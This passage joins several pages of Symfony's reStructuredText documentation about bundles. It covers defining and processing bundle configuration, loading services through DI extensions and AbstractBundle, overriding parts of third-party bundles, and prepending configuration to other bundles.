        use Symfony\Config\AcmeSocialConfig;

        return static function (AcmeSocialConfig $acmeSocial): void {
            $acmeSocial->twitter()
                ->clientId(123)
                ->clientSecret('your_secret');
        };

The basic idea is that instead of having the user override individual
parameters, you let the user configure just a few, specifically created,
options. As the bundle developer, you then parse through that configuration and
load correct services and parameters inside an "Extension" class.

.. note::

    The root key of your bundle configuration (``acme_social`` in the previous
    example) is automatically determined from your bundle name (it's the
    `snake case`_ of the bundle name without the ``Bundle`` suffix).

.. seealso::

    Read more about the extension in :doc:`/bundles/extension`.

.. tip::

    If a bundle provides an Extension class, then you should *not* generally
    override any service container parameters from that bundle. The idea
    is that if an Extension class is present, every setting that should be
    configurable should be present in the configuration made available by
    that class. In other words, the extension class defines all the public
    configuration settings for which backward compatibility will be maintained.

.. seealso::

    For parameter handling within a dependency injection container see
    :doc:`/configuration/using_parameters_in_dic`.

Processing the ``$configs`` Array
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

First things first, you have to create an extension class as explained in
:doc:`/bundles/extension`.

Whenever a user includes the ``acme_social`` key (which is the DI alias) in a
configuration file, the configuration under it is added to an array of
configurations and passed to the ``load()`` method of your extension (Symfony
automatically converts XML and YAML to an array).

For the configuration example in the previous section, the array passed to your
``load()`` method will look like this::

    [
        [
            'twitter' => [
                'client_id' => 123,
                'client_secret' => 'your_secret',
            ],
        ],
    ]

Notice that this is an *array of arrays*, not just a single flat array of the
configuration values. This is intentional, as it allows Symfony to parse several
configuration resources. For example, if ``acme_social`` appears in another
configuration file - say ``config/packages/dev/acme_social.yaml`` - with
different values beneath it, the incoming array might look like this::

    [
        // values from config/packages/acme_social.yaml
        [
            'twitter' => [
                'client_id' => 123,
                'client_secret' => 'your_secret',
            ],
        ],
        // values from config/packages/dev/acme_social.yaml
        [
            'twitter' => [
                'client_id' => 456,
            ],
        ],
    ]

The order of the two arrays depends on which one is set first.

But don't worry! Symfony's Config component will help you merge these values,
provide defaults and give the user validation errors on bad configuration.
Here's how it works. Create a ``Configuration`` class in the
``DependencyInjection`` directory and build a tree that defines the structure
of your bundle's configuration.

The ``Configuration`` class to handle the sample configuration looks like::

    // src/DependencyInjection/Configuration.php
    namespace Acme\SocialBundle\DependencyInjection;

    use Symfony\Component\Config\Definition\Builder\TreeBuilder;
    use Symfony\Component\Config\Definition\ConfigurationInterface;

    class Configuration implements ConfigurationInterface
    {
        public function getConfigTreeBuilder(): TreeBuilder
        {
            $treeBuilder = new TreeBuilder('acme_social');

            $treeBuilder->getRootNode()
                ->children()
                    ->arrayNode('twitter')
                        ->children()
                            ->integerNode('client_id')->end()
                            ->scalarNode('client_secret')->end()
                        ->end()
                    ->end() // twitter
                ->end()
            ;

            return $treeBuilder;
        }
    }

.. seealso::

    The ``Configuration`` class can be much more complicated than shown here,
    supporting "prototype" nodes, advanced validation, XML-specific normalization
    and advanced merging. You can read more about this in
    :doc:`the Config component documentation </components/config/definition>`. You
    can also see it in action by checking out some core Configuration
    classes, such as the one from the `FrameworkBundle Configuration`_ or the
    `TwigBundle Configuration`_.

This class can now be used in your ``load()`` method to merge configurations and
force validation (e.g. if an additional option was passed, an exception will be
thrown)::

    // src/DependencyInjection/AcmeSocialExtension.php
    public function load(array $configs, ContainerBuilder $container): void
    {
        $configuration = new Configuration();

        $config = $this->processConfiguration($configuration, $configs);

        // you now have these 2 config keys
        // $config['twitter']['client_id'] and $config['twitter']['client_secret']
    }

The ``processConfiguration()`` method uses the configuration tree you've defined
in the ``Configuration`` class to validate, normalize and merge all the
configuration arrays together.

Now, you can use the ``$config`` variable to modify a service provided by your bundle.
For example, imagine your bundle has the following example config:

.. code-block:: xml

    <!-- src/config/services.xml -->
    <?xml version="1.0" encoding="UTF-8" ?>
    <container xmlns="http://symfony.com/schema/dic/services"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://symfony.com/schema/dic/services
            https://symfony.com/schema/dic/services/services-1.0.xsd"
    >
        <services>
            <service id="acme.social.twitter_client" class="Acme\SocialBundle\TwitterClient">
                <argument></argument> <!-- will be filled in with client_id dynamically -->
                <argument></argument> <!-- will be filled in with client_secret dynamically -->
            </service>
        </services>
    </container>

In your extension, you can load this and dynamically set its arguments::

    // src/DependencyInjection/AcmeSocialExtension.php
    namespace Acme\SocialBundle\DependencyInjection;

    use Symfony\Component\Config\FileLocator;
    use Symfony\Component\DependencyInjection\Loader\XmlFileLoader;

    public function load(array $configs, ContainerBuilder $container): void
    {
        $loader = new XmlFileLoader($container, new FileLocator(dirname(__DIR__).'/Resources/config'));
        $loader->load('services.xml');

        $configuration = new Configuration();
        $config = $this->processConfiguration($configuration, $configs);

        $definition = $container->getDefinition('acme.social.twitter_client');
        $definition->replaceArgument(0, $config['twitter']['client_id']);
        $definition->replaceArgument(1, $config['twitter']['client_secret']);
    }

.. tip::

    Instead of calling ``processConfiguration()`` in your extension each time you
    provide some configuration options, you might want to use the
    :class:`Symfony\\Component\\HttpKernel\\DependencyInjection\\ConfigurableExtension`
    to do this automatically for you::

        // src/DependencyInjection/HelloExtension.php
        namespace Acme\HelloBundle\DependencyInjection;

        use Symfony\Component\DependencyInjection\ContainerBuilder;
        use Symfony\Component\HttpKernel\DependencyInjection\ConfigurableExtension;

        class AcmeHelloExtension extends ConfigurableExtension
        {
            // note that this method is called loadInternal and not load
            protected function loadInternal(array $mergedConfig, ContainerBuilder $container): void
            {
                // ...
            }
        }

    This class uses the ``getConfiguration()`` method to get the Configuration
    instance.

.. sidebar:: Processing the Configuration yourself

    Using the Config component is fully optional. The ``load()`` method gets an
    array of configuration values. You can instead parse these arrays yourself
    (e.g. by overriding configurations and using :phpfunction:`isset` to check
    for the existence of a value). Be aware that it'll be very hard to support XML::

        public function load(array $configs, ContainerBuilder $container): void
        {
            $config = [];
            // let resources override the previous set value
            foreach ($configs as $subConfig) {
                $config = array_merge($config, $subConfig);
            }

            // ... now use the flat $config array
        }

.. _using-the-bundle-class:

Using the AbstractBundle Class
------------------------------

As an alternative, instead of creating an extension and configuration class as
shown in the previous section, you can also extend
:class:`Symfony\\Component\\HttpKernel\\Bundle\\AbstractBundle` to add this
logic to the bundle class directly::

    // src/AcmeSocialBundle.php
    namespace Acme\SocialBundle;

    use Symfony\Component\Config\Definition\Configurator\DefinitionConfigurator;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\HttpKernel\Bundle\AbstractBundle;

    class AcmeSocialBundle extends AbstractBundle
    {
        public function configure(DefinitionConfigurator $definition): void
        {
            $definition->rootNode()
                ->children()
                    ->arrayNode('twitter')
                        ->children()
                            ->integerNode('client_id')->end()
                            ->scalarNode('client_secret')->end()
                        ->end()
                    ->end() // twitter
                ->end()
            ;
        }

        public function loadExtension(array $config, ContainerConfigurator $containerConfigurator, ContainerBuilder $containerBuilder): void
        {
            // Contrary to the Extension class, the "$config" variable is already merged
            // and processed. You can use it directly to configure the service container.
            $containerConfigurator->services()
                ->get('acme.social.twitter_client')
                ->arg(0, $config['twitter']['client_id'])
                ->arg(1, $config['twitter']['client_secret'])
            ;
        }
    }

.. note::

    The ``configure()`` and ``loadExtension()`` methods are called only at compile time.

.. tip::

    The ``AbstractBundle::configure()`` method also allows to import the
    configuration definition from one or more files::

        // src/AcmeSocialBundle.php
        namespace Acme\SocialBundle;

        // ...
        class AcmeSocialBundle extends AbstractBundle
        {
            public function configure(DefinitionConfigurator $definition): void
            {
                $definition->import('../config/definition.php');
                // you can also use glob patterns
                //$definition->import('../config/definition/*.php');
            }

            // ...
        }

    .. code-block:: php

        // config/definition.php
        use Symfony\Component\Config\Definition\Configurator\DefinitionConfigurator;

        return static function (DefinitionConfigurator $definition): void {
            $definition->rootNode()
                ->children()
                    ->scalarNode('foo')->defaultValue('bar')->end()
                ->end()
            ;
        };

Modifying the Configuration of Another Bundle
---------------------------------------------

If you have multiple bundles that depend on each other, it may be useful to
allow one ``Extension`` class to modify the configuration passed to another
bundle's ``Extension`` class. This can be achieved using a prepend extension.
For more details, see :doc:`/bundles/prepend_extension`.

Dump the Configuration
----------------------

The ``config:dump-reference`` command dumps the default configuration of a
bundle in the console using the Yaml format.

As long as your bundle's configuration is located in the standard location
(``<YourBundle>/src/DependencyInjection/Configuration``) and does not have
a constructor, it will work automatically. If you
have something different, your ``Extension`` class must override the
:method:`Extension::getConfiguration() <Symfony\\Component\\DependencyInjection\\Extension\\Extension::getConfiguration>`
method and return an instance of your ``Configuration``.

Supporting XML
--------------

Symfony allows people to provide the configuration in three different formats:
Yaml, XML and PHP. Both Yaml and PHP use the same syntax and are supported by
default when using the Config component. Supporting XML requires you to do some
more things. But when sharing your bundle with others, it is recommended that
you follow these steps.

Make your Config Tree ready for XML
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The Config component provides some methods by default to allow it to correctly
process XML configuration. See ":ref:`component-config-normalization`" of the
component documentation. However, you can do some optional things as well, this
will improve the experience of using XML configuration:

Choosing an XML Namespace
~~~~~~~~~~~~~~~~~~~~~~~~~

In XML, the `XML namespace`_ is used to determine which elements belong to the
configuration of a specific bundle. The namespace is returned from the
:method:`Extension::getNamespace() <Symfony\\Component\\DependencyInjection\\Extension\\Extension::getNamespace>`
method. By convention, the namespace is a URL (it doesn't have to be a valid
URL nor does it need to exist). By default, the namespace for a bundle is
``http://example.org/schema/dic/DI_ALIAS``, where ``DI_ALIAS`` is the DI alias of
the extension. You might want to change this to a more professional URL::

    // src/DependencyInjection/AcmeHelloExtension.php
    namespace Acme\HelloBundle\DependencyInjection;

    // ...
    class AcmeHelloExtension extends Extension
    {
        // ...

        public function getNamespace(): string
        {
            return 'http://acme_company.com/schema/dic/hello';
        }
    }

Providing an XML Schema
~~~~~~~~~~~~~~~~~~~~~~~

XML has a very useful feature called `XML schema`_. This allows you to
describe all possible elements and attributes and their values in an XML Schema
Definition (an XSD file). This XSD file is used by IDEs for auto completion and
it is used by the Config component to validate the elements.

In order to use the schema, the XML configuration file must provide an
``xsi:schemaLocation`` attribute pointing to the XSD file for a certain XML
namespace. This location always starts with the XML namespace. This XML
namespace is then replaced with the XSD validation base path returned from
:method:`Extension::getXsdValidationBasePath() <Symfony\\Component\\DependencyInjection\\Extension\\ExtensionInterface::getXsdValidationBasePath>`
method. This namespace is then followed by the rest of the path from the base
path to the file itself.

By convention, the XSD file lives in ``config/schema/`` directory, but you
can place it anywhere you like. You should return this path as the base path::

    // src/DependencyInjection/AcmeHelloExtension.php
    namespace Acme\HelloBundle\DependencyInjection;

    // ...
    class AcmeHelloExtension extends Extension
    {
        // ...

        public function getXsdValidationBasePath(): string
        {
            return __DIR__.'/../config/schema';
        }
    }

Assuming the XSD file is called ``hello-1.0.xsd``, the schema location will be
``https://acme_company.com/schema/dic/hello/hello-1.0.xsd``:

.. code-block:: xml

    <!-- config/packages/acme_hello.xml -->
    <?xml version="1.0" encoding="UTF-8" ?>
    <container xmlns="http://symfony.com/schema/dic/services"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:acme-hello="http://acme_company.com/schema/dic/hello"
        xsi:schemaLocation="http://symfony.com/schema/dic/services
            https://symfony.com/schema/dic/services/services-1.0.xsd
            http://acme_company.com/schema/dic/hello
            https://acme_company.com/schema/dic/hello/hello-1.0.xsd"
    >
        <acme-hello:config>
            <!-- ... -->
        </acme-hello:config>

        <!-- ... -->
    </container>

.. _`FrameworkBundle Configuration`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bundle/FrameworkBundle/DependencyInjection/Configuration.php
.. _`TwigBundle Configuration`: https://github.com/symfony/symfony/blob/master/src/Symfony/Bundle/TwigBundle/DependencyInjection/Configuration.php
.. _`XML namespace`: https://en.wikipedia.org/wiki/XML_namespace
.. _`XML schema`: https://en.wikipedia.org/wiki/XML_schema
.. _`snake case`: https://en.wikipedia.org/wiki/Snake_case
How to Load Service Configuration inside a Bundle
=================================================

Services created by bundles are not defined in the main ``config/services.yaml``
file used by the application but in the bundles themselves. This article
explains how to create and load service files using the bundle directory
structure.

Creating an Extension Class
---------------------------

In order to load service configuration, you have to create a Dependency
Injection (DI) Extension for your bundle. By default, the Extension class must
follow these conventions (but later you'll learn how to skip them if needed):

* It has to live in the ``DependencyInjection`` namespace of the bundle;

* It has to implement the :class:`Symfony\\Component\\DependencyInjection\\Extension\\ExtensionInterface`,
  which is usually achieved by extending the
  :class:`Symfony\\Component\\DependencyInjection\\Extension\\Extension` class;

* The name is equal to the bundle name with the ``Bundle`` suffix replaced by
  ``Extension`` (e.g. the Extension class of the AcmeBundle would be called
  ``AcmeExtension`` and the one for AcmeHelloBundle would be called
  ``AcmeHelloExtension``).

This is how the extension of an AcmeHelloBundle should look like::

    // src/DependencyInjection/AcmeHelloExtension.php
    namespace Acme\HelloBundle\DependencyInjection;

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Extension\Extension;

    class AcmeHelloExtension extends Extension
    {
        public function load(array $configs, ContainerBuilder $container): void
        {
            // ... you'll load the files here later
        }
    }

Manually Registering an Extension Class
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When not following the conventions, you will have to manually register your
extension. To do this, you should override the
:method:`Bundle::getContainerExtension() <Symfony\\Component\\HttpKernel\\Bundle\\Bundle::build>`
method to return the instance of the extension::

    // ...
    use Acme\HelloBundle\DependencyInjection\UnconventionalExtensionClass;
    use Symfony\Component\DependencyInjection\Extension\ExtensionInterface;

    class AcmeHelloBundle extends Bundle
    {
        public function getContainerExtension(): ?ExtensionInterface
        {
            return new UnconventionalExtensionClass();
        }
    }

In addition, when the new Extension class name doesn't follow the naming
conventions, you must also override the
:method:`Extension::getAlias() <Symfony\\Component\\DependencyInjection\\Extension\\Extension::getAlias>`
method to return the correct DI alias. The DI alias is the name used to refer to
the bundle in the container (e.g. in the ``config/packages/`` files). By
default, this is done by removing the ``Extension`` suffix and converting the
class name to underscores (e.g. ``AcmeHelloExtension``'s DI alias is
``acme_hello``).

Using the ``load()`` Method
---------------------------

In the ``load()`` method, all services and parameters related to this extension
will be loaded. This method doesn't get the actual container instance, but a
copy. This container only has the parameters from the actual container. After
loading the services and parameters, the copy will be merged into the actual
container, to ensure all services and parameters are also added to the actual
container.

In the ``load()`` method, you can use PHP code to register service definitions,
but it is more common if you put these definitions in a configuration file
(using the YAML, XML or PHP format).

For instance, assume you have a file called ``services.xml`` in the
``config/`` directory of your bundle, your ``load()`` method looks like::

    use Symfony\Component\Config\FileLocator;
    use Symfony\Component\DependencyInjection\Loader\XmlFileLoader;

    // ...
    public function load(array $configs, ContainerBuilder $container): void
    {
        $loader = new XmlFileLoader(
            $container,
            new FileLocator(__DIR__.'/../../config')
        );
        $loader->load('services.xml');
    }

The other available loaders are ``YamlFileLoader`` and ``PhpFileLoader``.

Using Configuration to Change the Services
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The Extension is also the class that handles the configuration for that
particular bundle (e.g. the configuration in ``config/packages/<bundle_alias>.yaml``).
To read more about it, see the ":doc:`/bundles/configuration`" article.

Loading Services directly in your Bundle class
----------------------------------------------

Alternatively, you can define and load services configuration directly in a
bundle class instead of creating a specific ``Extension`` class. You can do
this by extending from :class:`Symfony\\Component\\HttpKernel\\Bundle\\AbstractBundle`
and defining the :method:`Symfony\\Component\\HttpKernel\\Bundle\\AbstractBundle::loadExtension`
method::

    // ...
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\HttpKernel\Bundle\AbstractBundle;

    class AcmeHelloBundle extends AbstractBundle
    {
        public function loadExtension(array $config, ContainerConfigurator $containerConfigurator, ContainerBuilder $containerBuilder): void
        {
            // load an XML, PHP or Yaml file
            $containerConfigurator->import('../config/services.xml');

            // you can also add or replace parameters and services
            $containerConfigurator->parameters()
                ->set('acme_hello.phrase', $config['phrase'])
            ;

            if ($config['scream']) {
                $containerConfigurator->services()
                    ->get('acme_hello.printer')
                        ->class(ScreamingPrinter::class)
                ;
            }
        }
    }

This method works similar to the ``Extension::load()`` method, but it uses
a new API to define and import service configuration.

.. note::

    Contrary to the ``$configs`` parameter in ``Extension::load()``, the
    ``$config`` parameter is already merged and processed by the
    ``AbstractBundle``.

.. note::

    The ``loadExtension()`` is called only at compile time.

Adding Classes to Compile
-------------------------

Bundles can hint Symfony about which of their classes contain annotations so
they are compiled when generating the application cache to improve the overall
performance. Define the list of annotated classes to compile in the
``addAnnotatedClassesToCompile()`` method::

    public function load(array $configs, ContainerBuilder $container): void
    {
        // ...

        $this->addAnnotatedClassesToCompile([
            // you can define the fully qualified class names...
            'Acme\\BlogBundle\\Controller\\AuthorController',
            // ... but glob patterns are also supported:
            'Acme\\BlogBundle\\Form\\**',

            // ...
        ]);
    }

.. note::

    If some class extends from other classes, all its parents are automatically
    included in the list of classes to compile.

Patterns are transformed into the actual class namespaces using the classmap
generated by Composer. Therefore, before using these patterns, you must generate
the full classmap executing the ``dump-autoload`` command of Composer.

.. caution::

    This technique can't be used when the classes to compile use the ``__DIR__``
    or ``__FILE__`` constants, because their values will change when loading
    these classes from the ``classes.php`` file.
Bundles
=======

.. toctree::
    :maxdepth: 2

    override
    best_practices
    configuration
    extension
    prepend_extension
How to Override any Part of a Bundle
====================================

When using a third-party bundle, you might want to customize or override some of
its features. This document describes ways of overriding the most common
features of a bundle.

.. _override-templates:

Templates
---------

Third-party bundle templates can be overridden in the
``<your-project>/templates/bundles/<bundle-name>/`` directory. The new templates
must use the same name and path (relative to ``<bundle>/templates/``) as
the original templates.

For example, to override the ``templates/registration/confirmed.html.twig``
template from the AcmeUserBundle, create this template:
``<your-project>/templates/bundles/AcmeUserBundle/registration/confirmed.html.twig``

.. caution::

    If you add a template in a new location, you *may* need to clear your
    cache (``php bin/console cache:clear``), even if you are in debug mode.

Instead of overriding an entire template, you may just want to override one or
more blocks. However, since you are overriding the template you want to extend
from, you would end up in an infinite loop error. The solution is to use the
special ``!`` prefix in the template name to tell Symfony that you want to
extend from the original template, not from the overridden one:

.. code-block:: twig

    {# templates/bundles/AcmeUserBundle/registration/confirmed.html.twig #}
    {# the special '!' prefix avoids errors when extending from an overridden template #}
    {% extends "@!AcmeUser/registration/confirmed.html.twig" %}

    {% block some_block %}
        ...
    {% endblock %}

.. _templating-overriding-core-templates:

.. tip::

    Symfony internals use some bundles too, so you can apply the same technique
    to override the core Symfony templates. For example, you can
    :doc:`customize error pages </controller/error_pages>` overriding TwigBundle
    templates.

Routing
-------

Routing is never automatically imported in Symfony. If you want to include
the routes from any bundle, then they must be manually imported from somewhere
in your application (e.g. ``config/routes.yaml``).

The easiest way to "override" a bundle's routing is to never import it at
all. Instead of importing a third-party bundle's routing, copy
that routing file into your application, modify it, and import it instead.

Controllers
-----------

If the controller is a service, see the next section on how to override it.
Otherwise, define a new route + controller with the same path associated to the
controller you want to override (and make sure that the new route is loaded
before the bundle one).

Services & Configuration
------------------------

If you want to modify the services created by a bundle, you can use
:doc:`service decoration </service_container/service_decoration>`.

If you want to do more advanced manipulations, like removing services created by
other bundles, you must work with :doc:`service definitions </service_container/definitions>`
inside a :doc:`compiler pass </service_container/compiler_passes>`.

Entities & Entity Mapping
-------------------------

Overriding entity mapping is only possible if a bundle provides a mapped
superclass (such as the ``User`` entity in the FOSUserBundle). It's possible to
override attributes and associations in this way. Learn more about this feature
and its limitations in `the Doctrine documentation`_.

Forms
-----

Existing form types can be modified defining
:doc:`form type extensions </form/create_form_type_extension>`.

.. _override-validation:

Validation Metadata
-------------------

Symfony loads all validation configuration files from every bundle and
combines them into one validation metadata tree. This means you are able to
add new constraints to a property, but you cannot override them.

To overcome this, the 3rd party bundle needs to have configuration for
:doc:`validation groups </validation/groups>`. For instance, the FOSUserBundle
has this configuration. To create your own validation, add the constraints
to a new validation group:

.. configuration-block::

    .. code-block:: yaml

        # config/validator/validation.yaml
        FOS\UserBundle\Model\User:
            properties:
                plainPassword:
                    - NotBlank:
                        groups: [AcmeValidation]
                    - Length:
                        min: 6
                        minMessage: fos_user.password.short
                        groups: [AcmeValidation]

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd"
        >
            <class name="FOS\UserBundle\Model\User">
                <property name="plainPassword">
                    <constraint name="NotBlank">
                        <option name="groups">
                            <value>AcmeValidation</value>
                        </option>
                    </constraint>

                    <constraint name="Length">
                        <option name="min">6</option>
                        <option name="minMessage">fos_user.password.short</option>
                        <option name="groups">
                            <value>AcmeValidation</value>
                        </option>
                    </constraint>
                </property>
            </class>
        </constraint-mapping>

Now, update the FOSUserBundle configuration, so it uses your validation groups
instead of the original ones.

.. _override-translations:

Translations
------------

Translations are not related to bundles, but to translation domains.
For this reason, you can override any bundle translation file from the main
``translations/`` directory, as long as the new file uses the same domain.

For example, to override the translations defined in the
``translations/AcmeUserBundle.es.yaml`` file of the AcmeUserBundle,
create a ``<your-project>/translations/AcmeUserBundle.es.yaml`` file.

.. _`the Doctrine documentation`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/inheritance-mapping.html#overrides
How to Simplify Configuration of Multiple Bundles
=================================================

When building reusable and extensible applications, developers are often
faced with a choice: either create a single large bundle or multiple smaller
bundles. Creating a single bundle has the drawback that it's impossible for
users to remove unused functionality. Creating multiple
bundles has the drawback that configuration becomes more tedious and settings
often need to be repeated for various bundles.

It is possible to remove the disadvantage of the multiple bundle approach by
enabling a single Extension to prepend the settings for any bundle. It can use
the settings defined in the ``config/*`` files to prepend settings just as if
they had been written explicitly by the user in the application configuration.

For example, this could be used to configure the entity manager name to use in
multiple bundles. Or it can be used to enable an optional feature that depends
on another bundle being loaded as well.

To give an Extension the power to do this, it needs to implement
:class:`Symfony\\Component\\DependencyInjection\\Extension\\PrependExtensionInterface`::

    // src/Acme/HelloBundle/DependencyInjection/AcmeHelloExtension.php
    namespace Acme\HelloBundle\DependencyInjection;

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Extension\PrependExtensionInterface;
    use Symfony\Component\HttpKernel\DependencyInjection\Extension;

    class AcmeHelloExtension extends Extension implements PrependExtensionInterface
    {
        // ...

        public function prepend(ContainerBuilder $container): void
        {
            // ...
        }
    }

Inside the :method:`Symfony\\Component\\DependencyInjection\\Extension\\PrependExtensionInterface::prepend`
method, developers have full access to the :class:`Symfony\\Component\\DependencyInjection\\ContainerBuilder`
instance just before the :method:`Symfony\\Component\\DependencyInjection\\Extension\\ExtensionInterface::load`
method is called on each of the registered bundle Extensions. In order to
prepend settings to a bundle extension developers can use the
:method:`Symfony\\Component\\DependencyInjection\\ContainerBuilder::prependExtensionConfig`
method on the :class:`Symfony\\Component\\DependencyInjection\\ContainerBuilder`
instance. As this method only prepends settings, any other settings done explicitly
inside the ``config/*`` files would override these prepended settings.

The following example illustrates how to prepend
a configuration setting in multiple bundles as well as disable a flag in multiple bundles
in case a specific other bundle is not registered::

    // src/Acme/HelloBundle/DependencyInjection/AcmeHelloExtension.php
    public function prepend(ContainerBuilder $container): void
    {
        // get all bundles
        $bundles = $container->getParameter('kernel.bundles');
        // determine if AcmeGoodbyeBundle is registered
        if (!isset($bundles['AcmeGoodbyeBundle'])) {
            // disable AcmeGoodbyeBundle in bundles
            $config = ['use_acme_goodbye' => false];
            foreach ($container->getExtensions() as $name => $extension) {
                match ($name) {
                    // set use_acme_goodbye to false in the config of
                    // acme_something and acme_other
                    //
                    // note that if the user manually configured
                    // use_acme_goodbye to true in config/services.yaml
                    // then the setting would in the end be true and not false
                    'acme_something', 'acme_other' => $container->prependExtensionConfig($name, $config),
                    default => null
                };
            }
        }

        // get the configuration of AcmeHelloExtension (it's a list of configuration)
        $configs = $container->getExtensionConfig($this->getAlias());

        // iterate in reverse to preserve the original order after prepending the config
        foreach (array_reverse($configs) as $config) {
            // check if entity_manager_name is set in the "acme_hello" configuration
            if (isset($config['entity_manager_name'])) {
                // prepend the acme_something settings with the entity_manager_name
                $container->prependExtensionConfig('acme_something', [
                    'entity_manager_name' => $config['entity_manager_name'],
                ]);
            }
        }
    }

The above would be the equivalent of writing the following into the
``config/packages/acme_something.yaml`` in case AcmeGoodbyeBundle is not
registered and the ``entity_manager_name`` setting for ``acme_hello`` is set to
``non_default``:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/acme_something.yaml
        acme_something:
            # ...
            use_acme_goodbye: false
            entity_manager_name: non_default

        acme_other:
            # ...
            use_acme_goodbye: false

    .. code-block:: xml

        <!-- config/packages/acme_something.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:acme-something="http://example.org/schema/dic/acme_something"
            xmlns:acme-other="http://example.org/schema/dic/acme_other"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://example.org/schema/dic/acme_something
                https://example.org/schema/dic/acme_something/acme_something-1.0.xsd
                http://example.org/schema/dic/acme_other
                https://example.org/schema/dic/acme_something/acme_other-1.0.xsd"
        >
            <acme-something:config use-acme-goodbye="false">
                <!-- ... -->
                <acme-something:entity-manager-name>non_default</acme-something:entity-manager-name>
            </acme-something:config>

            <acme-other:config use-acme-goodbye="false">
                <!-- ... -->
            </acme-other:config>

        </container>

    .. code-block:: php

        // config/packages/acme_something.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $container->extension('acme_something', [
                // ...
                'use_acme_goodbye' => false,
                'entity_manager_name' => 'non_default',
            ]);
            $container->extension('acme_other', [
                // ...
                'use_acme_goodbye' => false,
            ]);
        };

Prepending Extension in the Bundle Class
----------------------------------------

You can also prepend extension configuration directly in your
Bundle class if you extend from the :class:`Symfony\\Component\\HttpKernel\\Bundle\\AbstractBundle`
class and define the :method:`Symfony\\Component\\HttpKernel\\Bundle\\AbstractBundle::prependExtension`
method::

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\HttpKernel\Bundle\AbstractBundle;

    class FooBundle extends AbstractBundle
    {
        public function prependExtension(ContainerConfigurator $containerConfigurator, ContainerBuilder $containerBuilder): void
        {
            // prepend
            $containerBuilder->prependExtensionConfig('framework', [
                'cache' => ['prefix_seed' => 'foo/bar'],
            ]);

            // prepend config from a file
            $containerConfigurator->import('../config/packages/cache.php');
        }
    }

.. note::

    The ``prependExtension()`` method, like ``prepend()``, is called only at compile time.

.. versionadded:: 7.1

    Starting from Symfony 7.1, calling the :method:`Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\ContainerConfigurator::import`
    method inside ``prependExtension()`` will prepend the given configuration.
    In previous Symfony versions, this method appended the configuration.

Alternatively, you can use the ``prepend`` parameter of the
:method:`Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\ContainerConfigurator::extension`
method::

    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\DependencyInjection\Loader\Configurator\ContainerConfigurator;
    use Symfony\Component\HttpKernel\Bundle\AbstractBundle;

    class FooBundle extends AbstractBundle
    {
        public function prependExtension(ContainerConfigurator $containerConfigurator, ContainerBuilder $containerBuilder): void
        {
            // ...

            $containerConfigurator->extension('framework', [
                'cache' => ['prefix_seed' => 'foo/bar'],
            ], prepend: true);

            // ...
        }
    }

.. versionadded:: 7.1

    The ``prepend`` parameter of the
    :method:`Symfony\\Component\\DependencyInjection\\Loader\\Configurator\\ContainerConfigurator::extension`
    method was added in Symfony 7.1.

More than one Bundle using PrependExtensionInterface
----------------------------------------------------

If there is more than one bundle that prepends the same extension and defines
the same key, the bundle that is registered **first** will take priority:
next bundles won't override this specific config setting.
.. _page-creation-bundles:

The Bundle System
=================

.. caution::

    In Symfony versions prior to 4.0, it was recommended to organize your own
    application code using bundles. This is no longer recommended and bundles
    should only be used to share code and features between multiple applications.

A bundle is similar to a plugin in other software, but even better. The core
features of Symfony framework are implemented with bundles (FrameworkBundle,
SecurityBundle, DebugBundle, etc.) They are also used to add new features in
your application via `third-party bundles`_.

Bundles used in your applications must be enabled per
:ref:`environment <configuration-environments>` in the ``config/bundles.php``
file::

    // config/bundles.php
    return [
        // 'all' means that the bundle is enabled for any Symfony environment
        Symfony\Bundle\FrameworkBundle\FrameworkBundle::class => ['all' => true],
        // ...

        // this bundle is enabled only in 'dev'
        Symfony\Bundle\DebugBundle\DebugBundle::class => ['dev' => true],
        // ...

        // this bundle is enabled only in 'dev' and 'test', so you can't use it in 'prod'
        Symfony\Bundle\WebProfilerBundle\WebProfilerBundle::class => ['dev' => true, 'test' => true],
        // ...
    ];

.. tip::

    In a default Symfony application that uses :ref:`Symfony Flex <symfony-flex>`,
    bundles are enabled/disabled automatically for you when installing/removing
    them, so you don't need to look at or edit this ``bundles.php`` file.

Creating a Bundle
-----------------

This section creates and enables a new bundle to show there are only a few steps required.
The new bundle is called AcmeBlogBundle, where the ``Acme`` portion is an example
name that should be replaced by some "vendor" name that represents you or your
organization (e.g. AbcBlogBundle for some company named ``Abc``).

Start by creating a new class called ``AcmeBlogBundle``::

    // src/AcmeBlogBundle.php
    namespace Acme\BlogBundle;

    use Symfony\Component\HttpKernel\Bundle\AbstractBundle;

